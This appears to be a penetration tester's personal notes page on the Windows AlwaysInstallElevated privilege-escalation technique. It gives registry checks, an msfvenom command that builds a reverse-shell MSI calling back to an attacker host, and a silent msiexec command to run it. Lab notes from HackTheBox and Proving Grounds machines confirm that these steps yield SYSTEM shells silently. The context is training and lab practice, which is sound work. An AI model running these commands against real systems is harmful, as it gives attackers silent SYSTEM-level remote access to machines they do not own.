# AlwaysInstallElevated

Back to [[Windows-PrivEsc-Methodology]]

## Check

Both must return `0x1`:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Exploit

Generate MSI payload on Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o shell.msi
```

Execute on target:
```cmd
msiexec /quiet /qn /i shell.msi
```

---

## From Your Boxes

> **Shenzi** (PG) — WinPEAS revealed AlwaysInstallElevated set to 1 in both HKLM and HKCU
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=53 -f msi -o reverse.msi`, transferred to target, executed MSI = SYSTEM shell
> - Lesson: AlwaysInstallElevated is a guaranteed SYSTEM shell. Generate MSI, transfer, execute. Takes 60 seconds.

> **Love** (HTB) — WinPEAS found AlwaysInstallElevated enabled
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi > rev.msi`, then on target: `msiexec /quiet /qn /i rev.msi`
> - Lesson: The `/quiet /qn` flags are critical -- they suppress all UI so execution is silent. Without them, a dialog box may block execution.
